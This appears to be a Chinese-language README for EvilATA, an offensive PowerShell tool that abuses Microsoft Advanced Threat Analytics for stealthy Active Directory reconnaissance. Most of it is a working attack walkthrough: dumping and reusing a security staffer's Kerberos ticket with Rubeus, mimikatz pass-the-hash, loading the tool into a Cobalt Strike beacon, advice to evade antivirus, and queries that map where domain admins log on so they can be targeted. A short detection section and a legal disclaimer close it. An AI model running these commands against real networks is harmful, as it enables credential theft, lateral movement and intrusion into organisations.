```

 ____, __  _, ____, __    ___,   ____, ___,  
(-|_, (-\ |  (-|   (-|   (-|_\_,(-|   (-|_\_,
 _|__,   \|   _|__, _|__, _|  )  _|    _|  ) 
(            (     (     (      (     (      

```

# EvilATA

Advanced Threat Analytics（ATA）是微软推出的企业级域安全监测平台，通过捕获和分析 Kerberos、DNS、RPC、NTLM 等协议的流量，对内网存在的威胁进行检测和告警。

ATA 的防护效果很不错，尤其是针对 Kerberos 流量中域对象可疑活动的监测及时且准确，但对于 NTLM 协议的横向移动检测能力较弱（Pth、Relay）。

ATA 有一项功能可以有效提升甲方安全人员的使用效率：即可以直接在 ATA WEB 平台查询某个域对象（域用户对象、域计算机对象、域安全组对象等）的活动时间线，什么时间做了什么，访问了谁，被谁访问，什么时候有认证行为，都一目了然。

![img_5b25fceb4d1b5](README/img_5b25fceb4d1b5.png)

红方进入一个域后，如何快速、高效定位基础设施和高权限账号的所在位置是一个重要课题。

试想如果攻击者在内网取得了 ATA 的访问权限，那么这些信息对其来说意义巨大：红队大量域渗透的前期侦查工作均可直接通过 ATA 进行，且可以有效避开安全设备的检测（这是因为不直接与域内的成员机发生交互），例如：

> 1、定位高权限域安全组及其成员；
>
> 2、快速定位域内重要的 AD 组件和基础设施（ADCS、ADFS、DC、SCCM、WSUS、EXCHANGE）；
>
> 3、查看高权限账户或特定账户最近登录过哪些计算机，以快速针对性打点；
>
> 4、查看目标计算机被哪些用户登录过，以快速针对性打点；
>
> 5、检查威胁事件，判断自身是否暴露；
>
> ...

EvilATA 可以帮助红队人员实现该目标，前提是已取得 ATA 的访问权限。

ATA Server 搭建完成后会新建三个本地安全组（🔗 https://learn.microsoft.com/zh-cn/advanced-threat-analytics/ata-role-groups）：

- - Microsoft Advanced Threat Analytics Administrators
  - Microsoft Advanced Threat Analytics Users
  - Microsoft Advanced Threat Analytics Viewers

通过在 ATA Server 本地组加入用户来赋予权限。

通常来说，企业的安全团队具备对于 ATA 的访问权限，可通过 OU 查询安全、运维相关团队成员发起特定攻击。

只要获取到 HTTP/ata.yourdomain.com 的 TGS 票据，即可访问 ATA（通过 443 端口）。

## Features

* EvilATA 使用 Windows 原生 PowerShell，无需多余编程环境支持；
* 文件结构简单，可直接通过 cobaltstrike 利用 powershell-import 载入 beacon；
* 利用过程均为 PowerShell 对象输出，灵活性高、格式化输出文件方便二次利用；
* 可输入输出 CSV、Json、TXT 等格式（只要是 PowerShell 支持的），文本处理简单；
* 混淆、免杀方式多，且常规杀软针对 PowerShell 的检测较弱（Windows Defender 除外）；

![Screenshot2022-12-21 15.42.28](README/Screenshot2022-12-21%2015.42.28.jpg)

EvilATA 基于以下项目开发：

```
https://github.com/PowerShellMafia/PowerSploit
https://github.com/microsoft/Advanced-Threat-Analytics
https://github.com/RamblingCookieMonster/Invoke-Parallel
```

## Installation

### Requirements

* ATA Center Version 1.8+
* PowerShell Version 5.1+ (Win10 default)

### Installation

```
PS c:\> git clone https://github.com/NickYan7/EvilATA.git
PS c:\> ipmo .\EvilATA.ps1

// ** 注意 ** Notice **
// 每次载入 EvilATA 之后，需要首先配置你所在域的 ATA Server 域名（或者 IP）
PS c:\> Set-ATACenterURL "ata.yourdomain.com"
```

载入 EvilATA 库时将自动载入 PowerView 和 Invoke-Parallel。目前原版 PowerView 已被标记为恶意，请自行免杀。

## Usage

### 如果您是企业安全人员（Using EvilATA as an enterprise security staff）

以企业安全人员使用 EvilATA 非常简单，其默认已具备了域内查询权限和 ATA 访问权限。只需载入 EvilATA 库，确保 PowerView 没有被拦截即可。

```
PS c:\> ipmo .\EvilATA.ps1
PS c:\> Set-ATACenterURL "ata.yourdomain.com"
PS c:\> Get-ATAUniqueEntity (Get-NetUser administrator).objectguid
PS c:\> Get-ATAUniqueEntity (Get-NetUser administrator).objectguid -Profile
```

**EvilATA 通过 ObjectGuid 定位域对象（ATA 也是如此）。** 因此 `-Id` 参数的实参必须是域内一个对象的 ObjectGuid 值，域对象的 ObjectGuid 属性一般使用 PowerView 进行查询。

EvilATA 提供了 4 项基础 Cmd-Let（即 Abusing Advanced Threat Analytics PowerShell module 所提供的）：

* Get-ATAMonitoringAlert
* Get-ATAStatus
* Get-ATASuspiciousActivity
* Get-ATAUniqueEntity

```
PS c:\> man Get-ATAUniqueEntity

NAME
    Get-ATAUniqueEntity

SYNOPSIS
    Get-ATAUniqueEntity is used to retrieve information around unique entities in ATA.


    -------------------------- EXAMPLE 1 --------------------------

    PS C:\>Get-ATAUniqueEntity -Id ff336d33-81f4-458c-b70b-33f0070ffb20

    DnsName                    : 2012R2-DC1.contoso.com
    DomainController           : @{IsGlobalCatalog=True; IsPrimary=True; IsReadOnly=False}
    IpAddress                  :
    IsDomainController         : True
    IsServer                   : True
    OperatingSystemDisplayName : Windows Server 2012 R2 Datacenter, 6.3 (9600)
    SystemDisplayName          : 2012R2-DC1
    BadPasswordTime            :
    ConstrainedDelegationSpns  : {}
    ExpiryTime                 :
    IsDisabled                 : False
    IsExpired                  : False
    IsHoneytoken               : False
    IsLocked                   : False
    IsPasswordExpired          : False
    IsPasswordFarExpiry        : False
    IsPasswordNeverExpires     : False
    IsPasswordNotRequired      : False
    IsSmartcardRequired        : False
    PasswordExpiryTime         :
    PasswordUpdateTime         : 2017-04-17T17:59:57.0826645Z
    Spns                       : {Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/2012R2-DC1.contoso.com, ldap/2012R2-DC1.contoso.com/ForestDnsZones.contoso.com,
                                 ldap/2012R2-DC1.contoso.com/DomainDnsZones.contoso.com, TERMSRV/2012R2-DC1...}
    UpnName                    :
    Description                :
    IsSensitive                : True
    SamName                    : 2012R2-DC1$
    DomainId                   : 7c915dca-0591-4abe-84c6-2522466bed4d
    CanonicalName              : contoso.com/Domain Controllers/2012R2-DC1
    CreationTime               : 2017-04-17T17:59:40Z
    DistinguishedName          : CN=2012R2-DC1,OU=Domain Controllers,DC=contoso,DC=com
    IsDeleted                  : False
    IsNew                      : False
    Sid                        : S-1-5-21-3599243929-1086515894-1402892407-1001
    SystemSubDisplayName       :
    Id                         : ff336d33-81f4-458c-b70b-33f0070ffb20
    IsPartial                  : False
    Type                       : Computer

    The above example retrieves information about the specified unique entity.
```

### 在已加域计算机上利用（Abusing EvilATA on domain-joined computers）

在已加域计算机上利用 EvilATA 比较简单，在已加域计算机上我们默认已具备域内查询权限（即 PowerView 可正常工作）。

1、当我们成功横移至某安全人员的计算机，首先提取其 TGS 票据

```
beacon> powerpick rubeus dump /service:http /user:nick /nowrap
beacon> powerpick [io.file]::WriteAllBytes("c:\users\nick\desktop\http.kirbi",[Convert]::FromBase64String("<base64-code>"))
```

这里的 TGS 票据需要是访问 ata.yourdomain.com 的 HTTP 票据，SPN 为 HTTP/ata.yourdomain.com。

然后在本地导入票据：

```
PS c:\> rubeus ptt /ticket:"c:\users\nick\desktop\http.kirbi"
PS c:\> klist
```

2、此时便可以通过该 HTTP 票据访问 ATA 数据：

```
PS c:\> ipmo .\EvilATA.ps1
PS c:\> Set-ATACenterURL "ata.yourdomain.com"
PS c:\> Get-ATAUniqueEntity "<objectguid>" -Profile | select -ExpandProperty logon* | sort logontime -Descending | ft -auto
```

⚠️ TGS 票据默认有效时长 10 小时。

### 在未加域计算机上利用（Abusing EvilATA on non domain-joined computers）

在未加域计算机上利用，首先需要能够执行 PowerView（PowerView 不支持通过票据认证），那么：

1、首先把未加域计算机的 DNS Server 指向 Domain Controller；

2.1、如果有任意域用户的 `原文口令` ，则使用 `RunAS` ：

```
PS c:\> runas /netonly /user:yourdomain\nick PowerShell
```

2.2、如果有任意域用户的 `NTLM HASH`，则使用 `Pth` ：

```
PS c:\> mimikatz "sekurlsa::pth /domain:yourdomain.com /user:nick /ntlm:<ntlm_hash>" exit
```

这两种方式任选一种均可拿到一个具备域用户基础凭据的 Shell。

3、载入 EvilATA 库，使用 `ptt` 载入安全人员的 HTTP/ata.yourdomain.com 的票据，进行利用：

```
PS c:\> rubeus ptt /ticket:http.kirbi

// EvilATA 中已自动载入 PowerView 库
PS c:\> ipmo .\EvilATA.ps1
PS c:\> Set-ATACenterURL "ata.yourdomain.com"
```

![Screenshot2022-12-21 11.57.27](README/Screenshot2022-12-21%2011.57.27.jpg)

### 示例 1：查询域管理员组中的账户登录了哪些域内计算机及其 IP

**EvilATA 通过 ObjectGuid 定位域对象（ATA 也是如此）。** 因此 `-Id` 参数的实参必须是域内一个对象的 ObjectGuid 值，域对象的 ObjectGuid 属性一般使用 PowerView 进行查询。

```
PS c:\> (Get-NetGroup "domain admins").member | %{Get-NetUser $_} | %{Get-ATAUniqueEntity $_.objectguid -Profile} | select -exp logon*
```

![Screenshot2022-12-21 16.10.27](README/Screenshot2022-12-21%2016.10.27.jpg)

### 示例 2：定位 Exchange Server

```
PS c:\> (Get-NetGroup "Exchange Trusted Subsystem").member | %{Get-NetComputer $_} | %{(Get-ATAUniqueEntity $_.objectguid -Profile | select -exp ipaddress* | sort date -Descending)[0]}
```

![Screenshot2022-12-21 16.20.23](README/Screenshot2022-12-21%2016.20.23.jpg)

可关注的 Property 包括但不限于：

```
AccessedResourceAccountIdToTimeMapping
DateToPrivilegeEscalationPathsMapping
DateToSourceComputerIdToProtocolToCertaintyMapping
GeolocationIdToTimeMapping
Id
IsBehaviorChanged
LogonComputerIdToTimeMapping
OpenSuspiciousActivityCount
SuspiciousActivitySeverityToCountMapping
Type
UpdateTime
```

结合 PowerView 利用 EvilATA，只要你熟悉 PowerShell 中「万物皆是对象」和「管道传输对象」两个概念，便可以拓展出非常多侦查场景，可以极大提高域渗透侦查的效率。

传统的 SAMR 协议查询（即 net xxx /domain 命令、wmic 命令）如今已经非常容易被检测到，如果你进入一个域后还在执行 `net group "domain admins" /domain` 、 `net user administrator /domain` 这种命令，那么暴露的概率不是 100%，而是 200%。

在域内如果有 ATA 作为安全监测设备（那么可以肯定这家企业对于 AD 的安全建设已在一定水平），则优先利用 ATA 进行侦查；如果没有 ATA，则使用 PowerView 或者 PowerShell AD Module 是比较好的选择（或者 ADFind）。

### 示例 3：查询某 OU 下的所有人员的主机登录情况

例如针对某 OU 下 28 个域用户对象进行查询，返回 715 个域计算机对象作为结果保存为一个变量，测试耗时 6 分 40 秒。后续只需针对该变量进行条件查询：

```
PS c:\> $result = Get-NetUser -SearchBase "OU=IT,DC=yourdomain,DC=com" | %{Get-ATAUniqueEntity $_.objectguid -Profile} | select -exp logon*
```

然后从 28 个用户中进行筛选，以登录时间排序其最近登录的计算机，并输出 IP：

```
PS c:\> $result.identityrefer | select -unique
PS c:\> $result |? identityrefer -eq "nick" | sort logontime -Descending | ft -auto
```

![Screenshot2022-12-22 20.53.22](README/Screenshot2022-12-22%2020.53.22.jpg)

从 `$result` 中筛选出被登录次数最多的计算机从而发起针对性攻击：

```
PS c:\> $result | Group-Object atasamname | sort count -Descending
```

![Screenshot2022-12-22 20.32.27](README/Screenshot2022-12-22%2020.32.27.jpg)

## Detection

对于甲方安全建设人员，可以从以下思路加强对此类恶意活动的监测：

### 1、加强 ATA Server 访问权限管控

ATA 的访问权限由 ATA Server 的本地安全组进行控制，无法从外部或域控进行查询，理论上只有 ATA Server 管理员具有查阅。所以需严格控制 ATA Server 的管理员权限。

### 2、对频繁访问 ATA 的行为进行监控

一般安全人员通过登录 ATA WEB 平台进行浏览，这种访问方式短时间内不会产生高频次的 Access 记录。

而 EvilATA 本质上是一种爬虫行为，通过 EvilATA 访问 ATA 会产生大量访问记录（被窃取账号的 HTTP 票据访问记录），可通过该特征监测短时间内大量访问 ATA 的账号和计算机，当判定为账号陷落时需立刻展开应急响应活动。

## Update

### 12-21-2022

> 1、优化查询逻辑，将域计算机对象和域用户对象的查询方式分开；
>
> 2、更新了 Get-ATAUniqueEntity 中域用户对象的 LogonComputerIdToTimeMapping 属性，现可输出 ComputerName、ATASamName 属性；
>
> 3、更新了 Get-ATAUniqueEntity 中域计算机对象的 LogonSourceAccountIdToTimeMapping 属性，现可输出 LogonUserName、ATASamName 属性；
>
> 4、更新了 Get-ATAUniqueEntity 中域计算机对象的 IPAddressToTimeMapping 属性，现可输出 DnsHostName、Date（连接到域控时的 IP 的接入时间）属性；
>
> 5、对 Get-ATAUniqueEntity 中涉及时间的属性均格式化为本地时间，增强可读性。

### 12-22-2022

> 1、解决了一处 if/else 逻辑缺陷导致的输出对象重复；
>
> 2、加入了 Invoke-Parallel 库，大幅提升运行速度。测试优化前抓取 72 个对象耗时 1 分 14 秒，优化后抓取 72 个对象耗时 35 秒，速度提升 52%；
>
> 3、解决了 Invoke-Parallel 无法调用外部库的问题，解决了 Invoke-Parallel 和 Add-Member 的适配问题；
>
> 4、现执行查询时带有进度条展示；
>
> 5、解决了多线程 Runspace 下嵌套调用 EvilATA 的问题；
>
> 6、优化了 Get-ATAUniqueEntity 中域用户对象的 LogonComputerIdToTimeMapping 属性，现可输出每一台登录计算机的 IP（最后一次与域控通信时）；
>
> 7、更新了 Get-ATAUniqueEntity 中域用户对象的 AccessedResourceAccountIdToTimeMapping 属性，现可输出用户访问的所有资源对象的 AccessedResourceName、IPAddress、AccessedTime；



## Disclaimer

本工具仅面向**合法授权**的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。

为避免被恶意使用，本项目所有收录的 POC 均为理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标进行扫描。**

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。

在安装并使用本工具前，请您**务必审慎阅读、充分理解各条款内容**，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。

## Todo

> 1、优化安全事件的输出；
>
> 2、优化 EvilATA 载入 cobaltstrike beacon；
>
> 3、优化 Invoke-Parallel 潜在的 Bug；

如果有任何建议或者遇到 Bug，欢迎提 Issue。

